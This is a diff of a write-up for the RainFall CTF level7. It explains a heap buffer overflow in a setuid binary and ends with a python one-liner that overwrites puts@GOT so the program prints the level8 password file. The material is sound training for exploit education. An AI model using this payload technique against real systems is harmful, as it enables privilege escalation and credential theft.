@@ -1,8 +1,46 @@
-# LEVEL7
+# LEVEL7 - Heap Overflow & GOT Overwrite
 
-## Analysis 
+> Vulnerability class: Heap Buffer Overflow
+> Binary: ELF 32-bits, dynamically linked, not stripped
+> Tools used: GDB, objdump, ltrace, file
 
-Let's try to check how the program works:
+---
+
+## Overview
+
+The program allocates four heap buffers with `malloc()` and copies two `argv` inputs via `strcpy()`. By overflowing the first `strcpy()`, we control the destination pointer of the second `strcpy()`, giving us an arbitrary write primitive. We use this to overwrite `puts@GOT` with the address of `m()`, which reads and prints the password file via `printf()`.
+
+---
+
+## 1. Reconnaissance
+
+```bash
+level7@RainFall:~$ file level7 
+   level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not strippedlevel7@RainFall:~$ file level7 
+```
+```bash
+   level7@RainFall:~$ checksec --file ./level7 
+   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level7
+```
+
+Key observations:
+
+- setuid/setgid binary: successful exploitation escalates privileges
+- not stripped: function names are preserved, simplifying static analysis
+- dynamically linked: library functions resolved at runtime via PLT/GOT
+- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
+- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
+- No stack canary: the saved return address can be overwritten without triggering any detection
+- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable
+
+---
+
+## 2. Static Analysis
+
+### 2.1 Program behavior
+
+The program requires exactly two arguments otherwie it segfaults:
 ```bash
    level7@RainFall:~$ ./level7
    Segmentation fault (core dumped)
@@ -10,90 +48,67 @@ Let's try to check how the program works:
    Segmentation fault (core dumped)
    level7@RainFall:~$ ./level7 a a
    ~~
-   level7@RainFall:~$ ./level7 a a a
-   ~~
-```
-It seems the program takes two input.
-
-So we have a main and a function <m> that calls a printf. It might be the vulnerability we will aim to trigger
-but let's try to analyse the program's behaviour first.
-
-
-If we give "salut" as input and try to break at every malloc ans strcpy we have the following behaviour:
-```gdb
-   # malloc 1
-   Breakpoint 1, 0x08048536 in main ()
-   (gdb) info register eax
-   eax            0x804a008        134520840
-
-   # malloc 2
-   Breakpoint 2, 0x08048550 in main ()
-   (gdb) info register eax
-   eax            0x804a018        134520856
-
-   # malloc 3
-   Breakpoint 3, 0x08048565 in main ()
-   (gdb) info register eax
-   eax            0x804a028        134520872
-
-   # malloc 4
-   Breakpoint 4, 0x0804857f in main ()
-   (gdb) info register eax
-   eax            0x804a038        134520888
-
-   # strcpy 1
-   (gdb) info register eax
-   eax            0x804a018        134520856
-
-   # strcpy 2
-   (gdb) info register eax
-   eax            0x804a038        134520888
 ```
 
-It seems like we have an offset of 16 between each malloc
-Breaking at the fopens with same input we got something interesting 
-```
-   Breakpoint 7 at 0xb7f56dc0 (2 locations)
-   (gdb) c
-   Continuing.
+### 2.2 Heap layout
 
+Four consecutive `malloc(8)` calls produce heap chunks spaced 16 bytes apart:
+```bash
+   malloc(8) → 0x804a008   # chunk 1: stores pointer to chunk 2
+   malloc(8) → 0x804a018   # chunk 2: receives argv[1] via strcpy
+   malloc(8) → 0x804a028   # chunk 3: stores pointer to chunk 4
+   malloc(8) → 0x804a038   # chunk 4: receives argv[2] via strcpy
+```
+
+`strcpy` calls copy into the second and fourth chunks:
+```bash
+   strcpy(0x0804a018, argv[1])
+   strcpy(0x0804a038, argv[2])
+```
+
+### 2.3 The `m()` function
+
+`m()` is never called by normal control flow. It reads from an uninitialized global `c` at `0x8049960` in `.bss` and prints it with `printf()`:
+```asm
+   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)         ; c (globak, .bss)
+   0x08048517 <+35>:    mov    %edx,(%esp)
+   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
+```
+With `objdump` we find:
+```
+   08049960 <c>:
+```
+
+### 2.4 Password file read
+
+`fopen()` opens `/home/user/level8/.pass` in read mode and `fgets()` stores its content into `c`. When `m()` is triggered, `printf()` prints whatever `fgets()` wrote there — the password.
+```bash
    Breakpoint 7, 0xb7e90e60 in fopen () from /lib/i386-linux-gnu/libc.so.6
    (gdb) x/3wx $esp
    0xbffff6fc:     0x080485d8      0x080486eb      0x080486e9
-   (gdb) x/wx $esp+12
-   0xbffff708:     0xb7fd0ff4
-   (gdb) stepi
-   0xb7e90e61 in fopen () from /lib/i386-linux-gnu/libc.so.6
-   (gdb) info args
-   No symbol table info available.
    (gdb) x/s 0x080486eb
    0x80486eb:       "/home/user/level8/.pass"
-   (gdb) 
 ```
-with one arg segfault before fgets. But we can see that something is trying to open the "/home/user/level8/.pass",
-so the file we're trying to get to 
-
-
-Lets check with ltrace and a different input : "salut salut":
-```bash
-   level7@RainFall:~$ ltrace ./level7 salut salut1
-   __libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
-   malloc(8)                                                                                                      = 0x0804a008
-   malloc(8)                                                                                                      = 0x0804a018
-   malloc(8)                                                                                                      = 0x0804a028
-   malloc(8)                                                                                                      = 0x0804a038
-   strcpy(0x0804a018, "salut")                                                                                    = 0x0804a018
-   strcpy(0x0804a038, "salut1")                                                                                   = 0x0804a038
-   fopen("/home/user/level8/.pass", "r")                                                                          = 0
-   fgets( <unfinished ...>
-   --- SIGSEGV (Segmentation fault) ---
-   +++ killed by SIGSEGV +++
 ```
-So we have the four mallocs allocating 8, arg1 being passed to strcpy1, arg2 being passed to strcpy2, fopen tryong to 
-read "/home/user/level8/.pass" and it segfaults at fgets.
+   fgets(-> c at 0x8049960, ...)
+```
 
+### 2.5 Normal control flow ends with `puts()`
 
-What happens with longer inputs (let's see if input controls are correct or flawed):
+At the end of `main()`, the program calls `puts("~~")`:
+```asm
+   0x080485f0 <+207>:    movl   $0x8048703, (%esp)    ; "~~"
+   0x080485f7 <+214>:    call   0x8048400 <puts@plt>
+```
+
+Goal: overwrite `puts@GOT` with the address of `m()` so that when `puts("~~")` is called, `m()` executes instead and prints the password.
+
+---
+
+## 3. Vulnerability
+
+`strcpy()` performs no bounds checking. The first `strcpy()` writes `argv[1]` into chunk 2 (`0x804a018`), which sits 16 bytes before chunk 3 (`0x804a028`). Chunk 3 holds the destination pointer used by the second `strcpy()`. Overflowing chunk 2 overwrites this pointer, giving us full control over where the second `strcpy()` writes — an arbitrary write primitive.
+
 ```bash
    level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBB
    __libc_start_main(0x8048521, 3, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
@@ -104,104 +119,62 @@ What happens with longer inputs (let's see if input controls are correct or flaw
    strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAA")                                                                    = 0x0804a018
    strcpy(0x08004141, "BBBBBBBBBBBBBBBBBB" <unfinished ...>
    --- SIGSEGV (Segmentation fault) ---
-   +++ killed by SIGSEGV +++
 ```
-Ok now it's becoming very interesting. With the first input wa can overflow the destination of the second strcpy.
 
-After a few tests, we found that 24 As is the right amount to overflow strcpy2 dest. So the offset is 20:
+---
+
+## 4. Exploitation
+
+### 4.1 Offset calculation
+
+The destination pointer of the second `strcpy()` lives in chunk 3 at `0x804a028`, which is 16 bytes past the start of chunk 2 at `0x804a018`. Adding 4 bytes for the chunk header gives an offset of 20 bytes:
+
 ```bash
-level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAA salut1
-   __libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
-   malloc(8)                                                                                                      = 0x0804a008
-   malloc(8)                                                                                                      = 0x0804a018
-   malloc(8)                                                                                                      = 0x0804a028
-   malloc(8)                                                                                                      = 0x0804a038
-   strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAA")                                                                  = 0x0804a018
-   strcpy(0x00414141, "salut1" <unfinished ...>
-   --- SIGSEGV (Segmentation fault) ---
-   +++ killed by SIGSEGV +++
-   level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAAA salut1
-   __libc_start_main(0x8048521, 3, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
-   malloc(8)                                                                                                      = 0x0804a008
-   malloc(8)                                                                                                      = 0x0804a018
-   malloc(8)                                                                                                      = 0x0804a028
-   malloc(8)                                                                                                      = 0x0804a038
+   level7@RainFall:~$ ltrace ./level7 AAAAAAAAAAAAAAAAAAAAAAAA test
    strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAA")                                                                 = 0x0804a018
-   strcpy(0x41414141, "salut1" <unfinished ...>
+   strcpy(0x41414141, "test" <unfinished ...>
    --- SIGSEGV (Segmentation fault) ---
-   +++ killed by SIGSEGV +++
 ```
+Full 4-byte overwrite confirmed at 20+4.
 
-NB: By the way the segfault happens for fgets in gdb and ltrace because it doesn't use the same env as if
-we launch the program in our shell as shown in the following exemple that worked in a regular environment:
-```bash
-   level7@RainFall:~$ ltrace ./level7 a a
-   __libc_start_main(0x8048521, 3, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
-   malloc(8)                                                                                                      = 0x0804a008
-   malloc(8)                                                                                                      = 0x0804a018
-   malloc(8)                                                                                                      = 0x0804a028
-   malloc(8)                                                                                                      = 0x0804a038
-   strcpy(0x0804a018, "a")                                                                                        = 0x0804a018
-   strcpy(0x0804a038, "a")                                                                                        = 0x0804a038
-   fopen("/home/user/level8/.pass", "r")                                                                          = 0
-   fgets( <unfinished ...>
-   --- SIGSEGV (Segmentation fault) ---
-   +++ killed by SIGSEGV +++
-```
+### 4.2 Locating `puts@GOT`
 
-So we know that on a regular environment our program succeed and goes through the function puts at the end of
-our porgram:
-```
-   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
-   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
-```
-And if we analyse what is given to puts, we understand that it is the one printing the "~~":
-```
-   (gdb) break main
-   Breakpoint 1 at 0x8048524
-   (gdb) run a a
-   Starting program: /home/user/level7/level7 a a
-
-   Breakpoint 1, 0x08048524 in main ()
-   (gdb) x/s 0x8048703
-   0x8048703:       "~~"
-```
-
-Also we can see in the funtion <m> that the printf reads from a uninitialized vac called <c>:
-```
- 804850f:       c7 44 24 04 60 99 04    movl   $0x8049960,0x4(%esp)
- 8048516:       08 
- 8048517:       89 14 24                mov    %edx,(%esp)
- 804851a:       e8 91 fe ff ff          call   80483b0 <printf@plt>
-```
-And in the the .bss section using the cmd objdump we foudn:
-```
-08049960 <c>:
-        ...
-```
-
-#### !!!!!! COULD EXPLAIN BETTER BUT DIFFICULT TO FIND WHERE FOPEN writes to !!!!
-So we could guess that fopen actually reads our password file (with option "r") and write it to <c> and then <m>
-would print the result with printf.
-
-
-## Solution 1: GOT
-
-What we could to the is try to override the puts function to actually call <m>.
-
-What we have:
-   - the right offset to overflow strcpy2 dest = 20.
-   - the address of the function <m> we want to trigger = 080484f4.
-
-What we need the address we want to override, puts:
 ```bash
    level7@RainFall:~$ objdump -R ./level7 | grep "puts"
    08049928 R_386_JUMP_SLOT   puts
 ```
 
-Ok we now have evrything we need for our attack:
+### 4.3 Payload construction
+
+```txt
+   argv[1]: [ 20 bytes padding ] + [ puts@GOT address ]
+   argv[2]: [ address of m()   ]
+```
+
+- 20 bytes of `A` fill chunk 2 up to the destination pointer in chunk 3
+- `\x28\x99\x04\x08` — overwrites the destination pointer with `puts@GOT` (`0x08049928`)
+- The second `strcpy()` then writes `\xf4\x84\x04\x08` (address of `m()`) into `puts@GOT`
+
+When `main()` calls `puts("~~")`, the GOT entry now points to `m()`, which prints the password.
+
+
+### 4.4 Execution
+
 ```bash
    level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    - 1762942544
 ```
+
+---
+
+## 5. Key Takeaways
+
+| Concept | Detail |
+|---|---|
+| `strcpy()` is unsafe | No bounds checking — overflows adjacent heap memory |
+| Heap pointer corruption | Overflowing one chunk corrupts the destination pointer of a subsequent `strcpy()` |
+| Arbitrary write primitive | Controlling a `strcpy()` destination = write anything anywhere |
+| GOT overwrite | Replacing a GOT entry redirects all future calls to that function |
+| Dead code reachability | `m()` is never called normally but becomes reachable via GOT hijacking |
+| fgets → .bss → printf | The password is read into a global variable and printed when `m()` is triggered |
